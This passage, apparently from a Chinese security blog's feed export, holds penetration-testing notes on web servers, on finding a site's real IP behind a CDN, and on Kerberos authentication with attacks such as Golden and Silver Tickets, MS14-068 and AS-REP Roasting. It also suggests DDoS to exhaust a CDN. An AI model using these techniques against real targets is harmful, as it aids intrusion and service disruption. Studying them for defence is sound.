<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h2><p>Web服务器是一种多功能、基于标准的 Web应用服务器。</p>
<p>各种应用开发、部署所有关键性的任务，无论是集成各种系统和数据库，还是提交服务、跨 Internet 协作，起始点都是 BEA WebLogic Server。</p>
<p>由于它具有全面的功能、对开放标准的遵从性、多层架构、支持基于组件的开发，基于 Internet 的企业都选择它来开发、部署最佳的应用。</p>
<h2 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h2><p>作为一台功能完善的开放 Web应用服务器， 是 IBM电子商务项目的核心部分，它为因特网和内网 Web应用建立、部署和管理 Java应用环境。</p>
<h2 id="BEAWeblogic"><a href="#BEAWeblogic" class="headerlink" title="BEAWeblogic"></a>BEAWeblogic</h2><p>BEAWebLogic是一个 Java应用服务器，用于开发、集成、部署和管理大型分布式 Web、网络和数据库应用程序。</p>
<h2 id="Lighttpd"><a href="#Lighttpd" class="headerlink" title="Lighttpd"></a>Lighttpd</h2><p>Lighttpd是由德国人JanKneschke领导开发的，基于BSD许可的开源WEB服务器软件。</p>
<p>其根本的目的是提供一个专门针对高性能网站，安全、快速、兼容性好并且灵活的webserver环境。</p>
<p>具有非常低的内存开销，CPU占用率低，效能好，以及丰富的模块等特点。</p>
<p>支持FastCGI,CGI,Auth,输出压缩(outputcompress),URL重写,Alias等重要功能。</p>
<h2 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>Resin是Caucho公司的产品，是一个非常流行的支持Servlet和JSP的服务器，速度非常快。</p>
<p>Resin的一种先进的语言XSL(XML stylesheet language)可以使得形式和内容相分离，支持EJB。</p>
<p>Resin本身包含了一个支持HTML的Web服务器，这使它不仅可以显示动态内容，而且显示静态内容的能力也毫不逊色。</p>
<h2 id="Sun"><a href="#Sun" class="headerlink" title="Sun"></a>Sun</h2><p>sun的 Java系统 Web服务器，即 sun ONE Web Server。大多数情况下是在运行 Sun公司的 Solaris操作系统的任务级 Web服务器上。</p>
<p>Sun Web Server包括ava™Servlet 2.3和JavaServer Pages™（JSP™）1.2规范的Java™2平台，企业版（J2EE™）兼容实现。符合J2EE的Web容器提供了设计和部署符合Java™技术标准的Web应用程序所需的灵活性和可靠性。</p>
<p>Sun是基于开放标准构建的多进程，多线程，安全的Web服务器</p>
<h2 id="Zeus"><a href="#Zeus" class="headerlink" title="Zeus"></a>Zeus</h2><p>Zeus是一个运行于Unix下的非常优秀的Web服务器，是效率最高的Web服务器之一。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>信息搜集-绕过CDN查找真实IP</title>
    <url>//6a3a4fb37fd1.html</url>
    <content><![CDATA[<h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>​        在渗透测试过程中，经常会碰到网站有CDN的情况。CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说的简单点，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。</p>
<h2 id="CDN的优势"><a href="#CDN的优势" class="headerlink" title="CDN的优势"></a>CDN的优势</h2><ul>
<li>提高用户访问频率，优化用户使用体验</li>
<li>隐藏真实服务器IP</li>
<li>提供WAF功能</li>
</ul>
<h2 id="访问方式"><a href="#访问方式" class="headerlink" title="访问方式"></a>访问方式</h2><ul>
<li>传统访问：用户访问域名——解析服务器IP——访问目标主机</li>
<li>普通CDN：用户访问域名——CDN节点——真实服务器IP——访问目标主机</li>
<li>带WAF的CDN：用户访问域名——CDN节点（云WAF）——真实服务器IP——访问目标主机</li>
</ul>
<h2 id="如何判断CDN"><a href="#如何判断CDN" class="headerlink" title="如何判断CDN"></a>如何判断CDN</h2><p>使用不同地方的ping服务，查看域名的对应IP地址是否唯一</p>
<p>如果不唯一就有可能使用了CDN</p>
<p>ping测试的网站</p>
<ul>
<li><a href="https://wepcc.com/">https://wepcc.com/</a></li>
<li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></li>
<li><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></li>
</ul>
<h2 id="验证IP是否为域名真实IP"><a href="#验证IP是否为域名真实IP" class="headerlink" title="验证IP是否为域名真实IP"></a>验证IP是否为域名真实IP</h2><p>修改本地hosts文件，将域名和IP解析对应</p>
<p>如何访问域名查看页面变化</p>
<h2 id="绕过CDN查找真实IP"><a href="#绕过CDN查找真实IP" class="headerlink" title="绕过CDN查找真实IP"></a>绕过CDN查找真实IP</h2><h3 id="1-查找子域名"><a href="#1-查找子域名" class="headerlink" title="1. 查找子域名"></a>1. 查找子域名</h3><p>当一个网站存在大量业务，使用了很多子站点，可能只对主站或者流量大的子站使用了CDN</p>
<p>而一些小的子站点和主站在一个服务器或者一个网段内</p>
<p>此时就可以查询子域名对应的IP来辅助查找真实IP</p>
<p>使用到的网站以及工具，建议多个工具配置使用</p>
<ul>
<li>在线子域名查询：<a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a></li>
<li>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li>DNSDB：<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></li>
<li>Layer 子域名挖掘机</li>
<li>subDomainBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
<li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
<li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li>
</ul>
<h3 id="2-查找顶级域名"><a href="#2-查找顶级域名" class="headerlink" title="2. 查找顶级域名"></a>2. 查找顶级域名</h3><p>为了方便，大多数网站只对www域名使用CDN，为的是维护网站更加方便，不用等待CDN缓存。</p>
<p>把www去掉，ping以下主域名，看一看IP有没有变化</p>
<h3 id="3-邮件服务器"><a href="#3-邮件服务器" class="headerlink" title="3. 邮件服务器"></a>3. 邮件服务器</h3><p>一般邮件系统在内部，不经过CDN的解析，通过网站内用户注册，评论，订阅等功能，查看邮件</p>
<p>寻找邮件头中的域名IP（第三方或者公共的邮件服务无效）</p>
<h3 id="查看域名历史解析记录"><a href="#查看域名历史解析记录" class="headerlink" title="查看域名历史解析记录"></a>查看域名历史解析记录</h3><p>若网站很久之前没有使用过CDN，所以可能存在使用CDN之前的记录</p>
<p>通过以下网站查询域名的历史解析记录</p>
<ul>
<li><p>在线域名解析记录：<a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p>
</li>
<li><p>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
</li>
<li><p>DNSDB：<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
</li>
<li><p>全球CDN查询：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
</li>
<li><p>Viewdns：<a href="https://viewdns.info/">https://viewdns.info/</a></p>
</li>
</ul>
<h3 id="国外访问"><a href="#国外访问" class="headerlink" title="国外访问"></a>国外访问</h3><p>国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了</p>
<p>因此通过国外代理访问网站，可能会得到真实的IP地址</p>
<h3 id="Nslookup-查询"><a href="#Nslookup-查询" class="headerlink" title="Nslookup 查询"></a>Nslookup 查询</h3><p>查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器</p>
<p><a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baiker.top</span><br><span class="line">nslookup -qt=txt baiker.top</span><br><span class="line">nslookup -qt=cname baiker.top</span><br><span class="line">nslookup -qt=txt baiker.top</span><br><span class="line">nslookup -qt=MX baiker.top</span><br></pre></td></tr></table></figure>



<h3 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h3><p>利用网站自身存在的漏洞，很多情况下会泄露自身服务器的真实IP</p>
<h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>利用搜索引擎获取IP地址</p>
<p>常见的比如Censys，sofa，zoomeye，shodan</p>
<h3 id="利用SSL证书"><a href="#利用SSL证书" class="headerlink" title="利用SSL证书"></a>利用SSL证书</h3><p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点</p>
<ul>
<li><a href="https://crt.sh/">https://crt.sh/</a></li>
<li><a href="https://censys.io/ipv4?q=github.com">https://censys.io/ipv4?q=github.com</a></li>
</ul>
<h3 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h3><p>DDOS耗尽CDN的流量，这样就能得到真实IP</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透-Kerberos</title>
    <url>//6344e2fdbfe9.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Kerberos 是 Active Directory 网络中域账户 基于加密 Ticket 的身份验证协议（不能在工作组中使用）</p>
<p>Kerberos 由 Kerberos SSP 实现</p>
<p>Kerberos 主要由三个部分组成：Key Distribution Center（KDC），Client，Server</p>
<p>Kerberos 基于 Ticket 实现身份认证，而非密码。<strong>如果客户端无法利用本地密钥，解密出 KDC 返回的加密Ticket，认证将无法通过。</strong></p>
<h2 id="Kerberos-特征"><a href="#Kerberos-特征" class="headerlink" title="Kerberos 特征"></a>Kerberos 特征</h2><p>Kerberos 身份验证和票证授予：TCP和UDP的88端口</p>
<p>经典Kerberos Kpaswd（密码重设）协议：TCP和UDP的464端口</p>
<p><strong>krbtgt账户</strong></p>
<p>每个域控制器DC都有一个kebtgt的用户账户，此账户是KDC的服务账户用来创建票据授予服务(TGS)加密的密钥</p>
<h2 id="LSA（Local-Security-Authority）本地安全机构"><a href="#LSA（Local-Security-Authority）本地安全机构" class="headerlink" title="LSA（Local Security Authority）本地安全机构"></a>LSA（Local Security Authority）本地安全机构</h2><p>LSA 管理本地的安全策略、管理审计策略和设置、为用户生成包含SID和组权限关系的令牌。LSA的验证过程:LSA通过访问本地SAM(Security Accounts Manager)数据库，可以完成本地用户的验证。</p>
<p>首先，用户注销、重启、锁屏后，操作系统会让  <code>winlogon.exe</code> 显示登录界面，也就是输入框，接收输入后，将密码交给  <code>lsass.exe</code> 进程，这个进程中会存一份明文密码，这个进程就是LSA（本地安全机构)</p>
<p>LSA在收到Winlogon的交给他的身份凭证后，判断交给Kerberos协议，或者是NTLM协议，因为我们知道用户登入有两种，一种是本地登入，一种是域登入。如果是本地登入的话，会使用本地数据库进行验证，如果是域登入的话，就会使用域控制器来进行身份验证。</p>
<p>LSA的处理流程：</p>
<p>LSA 首先把身份凭据交给 SSPI ，由该接口负责与 Kerberos 协议或者 NTML 协议沟通</p>
<p>SSPI不能确定用户是本地登录还是域账户进行域登录。所以他会先把身份认证请求传递到Kerberos SSP</p>
<p>Kerberos SSP会验证用户的登入目标是本地计算机还是域。如果是登录域,Kerberos SSP将继续处理。如果是本地计算机,即用户不是登录域,Kerberos SSP返回一个错误消息到SSPI,交回给GINA处理,使服务器登录不可用</p>
<p>SSPI现在发送请求到下一个安全提供程序——NTLM。NTLM SSP会将请求交给Netlogon服务针对LSAM (Local Security Account Manager,本地安全账户管理器)数据库进行身份认证。</p>
<h2 id="SSPI和SSP"><a href="#SSPI和SSP" class="headerlink" title="SSPI和SSP"></a>SSPI和SSP</h2><h3 id="SSPI"><a href="#SSPI" class="headerlink" title="SSPI"></a>SSPI</h3><p>SSPI（Security Support Provider Interface），即<strong>安全服务提供接口</strong>，这是 Windows 定义的特定接口，该接口定义了与安全相关的功能功能，但不仅限于：</p>
<ul>
<li>  身份验证</li>
<li>  税务信息</li>
<li>  为其他协议提供的会话安全机制</li>
</ul>
<h3 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h3><p>SSP（Security Service Provider），即<strong>安全服务提供者</strong>，他是SSPI的实现者，是对SSPI相关功能函数的具体实现。微软自己实现了的SSP，用于提供安全功能：</p>
<ul>
<li>  NTLM SSP</li>
<li>  Kerberos</li>
<li>  摘要 SSP</li>
<li>  信用SSP</li>
<li>  ……</li>
</ul>
<p>在一个系统消息，SSP就是dll，来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如NTLM SSP实现的一种挑战/响应验证机制。而Kerberos SSP实现的就是基于票据的身份验证机制。我们可以写自己的SSP，然后注册到内部，让外界支持更多的自定义身份验证方式。</p>
<h2 id="Kerberos-原理"><a href="#Kerberos-原理" class="headerlink" title="Kerberos 原理"></a>Kerberos 原理</h2><p>Kerberos 认证大概有三个阶段</p>
<ul>
<li>AS_REQ &amp; AS_REP<ul>
<li>  客户端发送主体1（NTLM-Hash加密）到AS，AS 向活动目录 AD 验证该用户</li>
<li>  AS 生成 TGS Session Key,并返回TGT（包含主体1和TGS Session Key，使用TGS密钥加密，也就是krbtgt账户的NTLM-Hash）和 TGS Session Key（NTLM-Hash加密）以及PAC等信息</li>
</ul>
</li>
<li>TGS_REQ &amp; TGS_REP<ul>
<li>  客户端解密得到 TGS Session Key，把 TGT 和主体2（TGS Session Key加密）发送给TGS</li>
<li>  TGS 解密 TGT 得到 TGS Session Key，使用 Key 解密得到主体2和 TGT 的主体1验证</li>
<li>  TGS 生成 Server Session Key，返回  Server Ticket（包含主体1和 Server Session Key，Server NTLM-Hash 加密）和  Server Session Key（TGS Session Key加密）</li>
</ul>
</li>
<li>AP_REQ &amp; AP_REP<ul>
<li>  客户端解密得到Server Session Key，把 Server Ticket 和 主体3（Server Session Key加密）发送给Server</li>
<li>  Server 解密 Server Ticket 得到 Server Session Key，使用 Key 解密得到主体3和 ST 的主体1验证 </li>
<li>  Server 拿着PAC 向 DC 验证，如果验证成功，返回客户端建立通信 </li>
</ul>
</li>
</ul>
<p><img src="https://techdocs.broadcom.com/content/dam/broadcom/techdocs/us/en/assets/docops/casso128/kerberos_environment.png"></p>
<p>第一步，客户端通过<code>kinit USERNAME</code>或其他方式，将客户端ID, 目标HTTP服务ID, 网络地址（可能是多个机器的IP地址列表，如果想在任何机器上使用，则可能为空），以及TGT有效期的寿命等信息发送给 Authentication Service。</p>
<p><img src="https://i.loli.net/2021/11/30/8J2INQrRYT7gzie.png"></p>
<p>第二步，Authentication Server 将检查客户端ID是否在KDC数据库中。</p>
<p><img src="https://i.loli.net/2021/11/30/9IZt5igTolC8mLe.png"></p>
<p>如果 Authentication Server 检查操作没有异常，那么KDC将随机生成一个 key，用于客户端与 Ticket Granting Service(TGS) 通信。这个Key，一般被称为 TGS Session Key。随后 Authentication Server 将发送<strong>两条信息</strong>给客户端。</p>
<p><img src="https://i.loli.net/2021/11/30/F7cIONHVxpPjGlY.png"></p>
<p>其中一条信息被称为TGT，由TGS的密钥加密，客户端无法解密，包含客户端ID, TGS Session Key等信息。另一条信息由客户端密钥加密，客户端可以正常解密，包含目标 HTTP 服务ID，TGS Session Key等信息。</p>
<p>第三步，客户端利用本地的密钥解密出第二条信息。如果本地密钥无法解密出信息，那么认证失败。</p>
<p><img src="https://i.loli.net/2021/11/30/2nCb8JDIOH7olFg.png"></p>
<p>第四步，客户端将 AS 发送过来的 TGT（TGS密钥加密） 和 Authenticator（客户端解密后，通过里面的 TGS Session Key 加密） 发送给 TGS（Ticket Granting Service）</p>
<p><img src="https://i.loli.net/2021/11/30/S2CIX34Qf1ZdnuO.png"></p>
<p>第五步，TGS 将利用 自身的密钥从TGT中解密出<strong>TGS Session Key</strong>，然后利用<strong>TGS Session Key</strong>从Authenticator 中解密出客户端的信息。</p>
<p><img src="https://i.loli.net/2021/11/30/HewUGVFgzxyPrbi.png"></p>
<p>TGS 解密出所有信息后，将进行身份检查，进行认证：</p>
<ul>
<li>  将客户端ID与TGT的客户端ID进行比较</li>
<li>  比较来自 Authenticator 的时间戳和TGT的时间戳 (典型的Kerberos系统的容忍度是2分钟，但也可以另行配置)</li>
<li>  检查TGT是否过期</li>
<li>  检查Authenticator是否已经在TGS的缓存中（为了避免重放攻击）</li>
</ul>
<p>当所有检查都通过后， TGS 随机生成一个 Key 用于后续客户端与 HTTP 服务交互时进行通信加密使用，即 HTTP Session Key。同样地，TGS 将发送<strong>两条信息</strong>给客户端: 其中一条是 HTTP Ticket，由 <strong>HTTP 服务的密钥</strong>进行加密；另一条则由<strong>TGS Session Key</strong>加密，包含了客户端信息与时间戳。</p>
<p><img src="https://i.loli.net/2021/11/30/OqnPagHZeIKkG4t.png"></p>
<p>第六步，客户端将利用<strong>TGS Session Key</strong>解密出其中一条信息，另一条信息由于是由目标HTTP服务加密，无法解密。</p>
<p><img src="https://i.loli.net/2021/11/30/LD4flATyCFbuzpZ.png"></p>
<p>第七步，客户端将TGS发送过来的 HTTP Ticket（HTTP密钥加密）和 Authenticator（HTTP Session Key） 转发给目标HTTP服务</p>
<p><img src="https://i.loli.net/2021/11/30/C5PWXnG1wzHMNxD.png"></p>
<p>第八步，HTTP服务首先利用自身的密钥解密出 HTTP Ticket 的信息，得到 HTTP Session Key；随后，利用HTTP Session Key解密出用户的Authenticator信息。</p>
<p><img src="https://i.loli.net/2021/11/30/K35AzSoP7N1eLdq.png"></p>
<p>信息解密完成后，HTTP 服务同样需要做一些信息检查：</p>
<ul>
<li>  将 Authenticator 中的客户端ID与HTTP Ticket中的客户端ID进行比较</li>
<li>  比较来自 Authenticator 的时间戳和 HTTP Ticket 的时间戳 (典型的 Kerberos 系统对差异的容忍度是 2 分钟，但也可以另行配置)</li>
<li>  检查Ticket是否过期</li>
<li>  检查 Authenticator 是否已经在HTTP服务器的缓存中（为了避免重播攻击）</li>
</ul>
<p>至此，所有的认证过程通过，客户端即可与远程HTTP服务完成了身份认证，可以进行后续的信息通信。</p>
<p><img src="https://i.loli.net/2021/11/30/KmGXHyLoVExuqDM.png"></p>
<h2 id="Kerberos-基本概念"><a href="#Kerberos-基本概念" class="headerlink" title="Kerberos 基本概念"></a>Kerberos 基本概念</h2><h3 id="Domain-Controller-（DC）"><a href="#Domain-Controller-（DC）" class="headerlink" title="Domain Controller （DC）"></a>Domain Controller （DC）</h3><p>域控制器，简称DC，一台计算机，实现用户，计算机的统一管理</p>
<h3 id="Key-Distribution-Center（KDC）"><a href="#Key-Distribution-Center（KDC）" class="headerlink" title="Key Distribution Center（KDC）"></a>Key Distribution Center（KDC）</h3><p>密钥分发中心，简称 KDC，默认安装在域控里</p>
<p>Key Distribution Center（KDC），是 Kerberos 的核心组件，主要由三部分组成：</p>
<ul>
<li>  Kerberos Database：包含了一个 Realm 中所有的 principal、密码与其他信息。（默认：Berkeley DB）</li>
<li>  Authentication Service（AS）： 进行用户信息认证，为客户端提供 Ticket Granting TicketsTGT)。</li>
<li>  Ticket Granting Service（TGS）： 验证 TGT 与 Authenticator，为客户端提供 Service Tickets。</li>
</ul>
<h3 id="Kerberos-KDC-Server"><a href="#Kerberos-KDC-Server" class="headerlink" title="Kerberos KDC Server"></a>Kerberos KDC Server</h3><p>作为 Kerberos 密钥分发中心（KDC）的服务器</p>
<h3 id="Kerberos-Client"><a href="#Kerberos-Client" class="headerlink" title="Kerberos Client"></a>Kerberos Client</h3><p>集群中所有使用KDC进行身份验证的任何计算机</p>
<h3 id="KDC-Admin-Account"><a href="#KDC-Admin-Account" class="headerlink" title="KDC Admin Account"></a>KDC Admin Account</h3><p>Ambari 用于在KDC中创建主体并生成密钥表的管理账户</p>
<h3 id="PAC-Privilege-Access-Certificate-特权访问证书"><a href="#PAC-Privilege-Access-Certificate-特权访问证书" class="headerlink" title="PAC(Privilege Access Certificate) 特权访问证书"></a>PAC(Privilege Access Certificate) 特权访问证书</h3><p>KDC在向Kerberos客户端颁发TGT时,会向本地LSA请求生成一个特殊的数据结构，名为特权访问证书。这个PAC包含为kerberos客户端构建一个本地访问令牌所需要的用户信息，它同时使用域控制器服务器的私钥和KDC服务器的私钥来进行数字签署，以防假的KDC伪造PAC</p>
<blockquote>
<p>  PAC数据结构</p>
<ol>
<li>用户的登入时间以及用户会话额到期时间</li>
<li>用户上一次设置密码的时间,以及允许他再次更改密码的时间</li>
<li>用户的经典登入名,domain\user</li>
<li>用户的显示名称</li>
<li>指派给用户账户的经典NT登入脚本的名称(如果有的话)</li>
<li>用户漫游配置文件的UNC路径</li>
<li>客户端主目录的UNC路径</li>
<li>用户的并发登入数</li>
<li>在颁发PAC的KDC处,自从上一次成功登入以来,所允许的不成功登入尝试次</li>
<li>用户的RID</li>
<li>用户的”主要组”的RID,只限在POSIX使用</li>
<li>在域中,将用户作为一个成员的组的数量,以及每个组的RID</li>
<li>适用于用户的已知SID</li>
<li>域的SID</li>
<li>资源域的SID<br>除此之外,PAC中还嵌入了另一个名为用户账户控制的数据结构</li>
</ol>
</blockquote>
<h3 id="Principal"><a href="#Principal" class="headerlink" title="Principal"></a>Principal</h3><p>Kerberos Principal  (又称为主体) 用于标识身份，主体可以是用户或者服务</p>
<p>主要由三部分构成：primary，instance(可选) 和 realm</p>
<p>三部分也就是主名称，实例和领域</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">asus/admin@EXAMPLE.COM</span><br></pre></td></tr></table></figure>

<p>主名称（primary）：可以是用户名或者服务</p>
<p>实例（instance）：对于用户主体是可选的，用于区分用户，例如<code>asus/admin</code>，对于服务是必须的，用于识别主机，例如<code>asus/node1.example.com</code>，如果一个用户存在不同主机，也可以使用主机名作为实例</p>
<p>领域（realm）：用于区分不同的Kerberos环境</p>
<h3 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a>Realm</h3><p>Kerberos 系统中的一个namespace，不同的Kerberos环境，可以通过realm区分</p>
<h3 id="Keytab"><a href="#Keytab" class="headerlink" title="Keytab"></a>Keytab</h3><p>包含了多个principal与密码的文件，使用该文件进行身份认证</p>
<p><code>keytab</code>是包含<code>principals</code>和加密<code>principal key</code>的文件。</p>
<p><code>keytab</code>文件对于每个<code>host</code>是唯一的，因为<code>key</code>中包含<code>hostname</code>。keytab文件用于不需要人工交互和保存纯文本密码，实现到<code>kerberos上</code>验证一个主机上的<code>principal</code>。</p>
<p>因为服务器上可以访问<code>keytab</code>文件即可以以<code>principal</code>的身份通过<code>kerberos</code>的认证，所以，<code>keytab</code>文件应该<strong>被妥善保存，应该只有少数的用户可以访问。</strong></p>
<h3 id="Ticket-Cache（票证）"><a href="#Ticket-Cache（票证）" class="headerlink" title="Ticket Cache（票证）"></a>Ticket Cache（票证）</h3><p>客户端与KDC交互后，包含身份认证信息的文件，短期有效</p>
<p>Ticket-Granting  和 TGT 都属于票证</p>
<p>获取访问 Server 端的票（Server Ticket，简称 ST）。ST（Service Ticket）也有资料称为 TGS Ticket</p>
<p>Ticket 用于将用户身份安全的转递到服务器或者服务，一个票证仅对一个客户端或者一个服务生效</p>
<p>票证包含以下内容：</p>
<ul>
<li>  服务的主体名称</li>
<li>  用户的主体名称</li>
<li>  用户主机的IP地址</li>
<li>  时间标记</li>
<li>  定义票证生命周期的值</li>
<li>  会话密钥的脚本</li>
</ul>
<h3 id="Credential-（凭证）"><a href="#Credential-（凭证）" class="headerlink" title="Credential （凭证）"></a>Credential （凭证）</h3><p>是一种信息包，其中包含票证和匹配的会话密钥</p>
<p>凭证使用发出请求的主体的密钥进行加密</p>
<p>通常，KDC 会生成凭证以响应客户端的票证请求</p>
<h3 id="Authenticator-（验证者）"><a href="#Authenticator-（验证者）" class="headerlink" title="Authenticator （验证者）"></a>Authenticator （验证者）</h3><p>是服务器用于验证客户机用户主体的信息。 验证者包含用户的主体名称、时间标记和其他数据。 </p>
<p>与票证不同，验证者只能使用一次，通常在请求访问服务时使用。 </p>
<p>验证者使用客户机和服务器共享的会话密钥进行加密。 </p>
<p>通常，客户机会创建验证者，并将其与服务器或服务的票证一同发送，以便向服务器或服务进行验证。</p>
<h3 id="Kerberos-默认主体"><a href="#Kerberos-默认主体" class="headerlink" title="Kerberos 默认主体"></a>Kerberos 默认主体</h3><p>每个票证都使用主体名称进行标识。主体名称可以标识用户或服务。以下是一些主体名称的示例</p>
<table>
<thead>
<tr>
<th align="center">主体名称</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>username@EXAMPLE.COM</code></td>
<td align="center">用户的主体</td>
</tr>
<tr>
<td align="center"><code>username/admin@EXAMPLE.COM</code></td>
<td align="center">admin 主体，可用于管理 KDC 数据库。</td>
</tr>
<tr>
<td align="center"><code>K/M@EXAMPLE.COM</code></td>
<td align="center">主密钥名称主体。一个主密钥名称主体可与每个主 KDC 关联。</td>
</tr>
<tr>
<td align="center"><code>krbtgt/EXAMPLE.COM@EXAMPLE.COM</code></td>
<td align="center">生成票证授予票证时使用的主体。</td>
</tr>
<tr>
<td align="center"><code>kadmin/host1.example.com@EXAMPLE.COM</code></td>
<td align="center">允许使用 kadmind 访问 KDC 的主 KDC 服务器的主体。</td>
</tr>
<tr>
<td align="center"><code>ambari-qa-xxx@EXAMPLE.COM</code></td>
<td align="center">Ambari用于执行服务“冒烟”检查并运行警报健康检查。</td>
</tr>
<tr>
<td align="center"><code>HTTP/host1.example.com@EXAMPLE.COM</code></td>
<td align="center">用于访问Hadoop Web UI时用到的principal</td>
</tr>
</tbody></table>
<h3 id="时钟同步"><a href="#时钟同步" class="headerlink" title="时钟同步"></a>时钟同步</h3><p>所有参与 Kerberos 验证系统的主机都必须在指定的最长时间（称为<strong>时钟相位差</strong>）内同步其内部时钟。针对这一要求，需要进行另一种 Kerberos 安全检查。如果任意两台参与主机之间的时间偏差超过了时钟相位差，则客户机请求会被拒绝。</p>
<p>当时钟相位差的最大值超过 300 秒（5分钟），就会导致 Kerberos 验证请求失败</p>
<h2 id="黄金票据（Golden-Ticket）"><a href="#黄金票据（Golden-Ticket）" class="headerlink" title="黄金票据（Golden Ticket）"></a>黄金票据（Golden Ticket）</h2><p>在Windows 的 Kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC 使用 Krbtgt 账户 的 NTML-Hash 作为密钥进行加密，生成 TGT。那么如果我们获取到 Krbtgt 的 NTML-Hash 值，不就可以伪造任意的 TGT 了么。因为 Krbtgt 只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。</p>
<h2 id="白银票据（Silver-Ticket）"><a href="#白银票据（Silver-Ticket）" class="headerlink" title="白银票据（Silver Ticket）"></a>白银票据（Silver Ticket）</h2><p>白银票据的利用过程是伪造 TGS，通过已知的授权服务密码生成一张可以访问该服务的 TGT。因为在票据生成过程中不需要使用 KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由 KDC 颁发 TGT，并且在生成伪造 TGT 的 20 分钟内，TGS 不会对该 TGT 的真伪进行校验。</p>
<p>白银票据依赖于服务账号的密码散列值，这不同于黄金凭据需要使用 Krbtgt 账号的密码哈希值，因此更加的隐蔽。</p>
<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>该漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在获得的票证 TGT 中插入任意的 PAC。使得普通用户通过具有改变了 PAC 的 TGT 来伪造票证获得管理员权限。</p>
<p>PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。</p>
<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>AS_REQ &amp; AS_REP 认证的过程是 Kerberos 身份认证的第一步，该过程又被称为预身份验证。预身份验证主要是为了防止密码脱机爆破。</p>
<p>而如果域用户设置了选项 <code>Do not require Kerberos preauthentication</code>（该选项默认没有开启）关闭了预身份验证的话，攻击者可以使用指定的用户去请求票据，向域控制器发送 <code>AS_REQ</code> 请求，此时域控会不作任何验证便将 TGT 票据和加密的 Session-key 等信息返回。因此攻击者就可以对获取到的加密 Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。</p>
<p>这种攻击方式被称作 AS-REP Roasting 攻击。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>安全机制</category>
      </categories>
      <tags>
        <tag>安全机制</tag>
        <tag>Kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透-Linux信息收集</title>
    <url>//0839a9742351.html</url>
